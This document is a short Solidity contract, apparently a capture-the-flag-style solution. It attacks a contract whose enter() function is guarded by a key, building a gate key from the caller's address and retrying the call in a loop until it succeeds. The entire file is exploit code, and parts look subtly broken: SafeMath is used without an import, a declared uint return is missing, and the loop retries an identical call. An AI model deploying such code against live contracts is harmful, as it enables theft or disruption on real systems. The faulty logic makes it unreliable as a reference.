pragma solidity ^0.6.0;

interface Target {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Crack {
    Target target;

    using SafeMath for uint256;

    constructor(address _target) public {
        target = Target(_target);
    }

    function crack() external returns (uint){
        bytes8 gateKey = bytes8(uint64(uint16(msg.sender)) + 0x1000000000000000);
        bool done = false;
        do {
            (bool success, bytes memory _) = address(target).call(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            done = success;
        } while (!done);
    }
}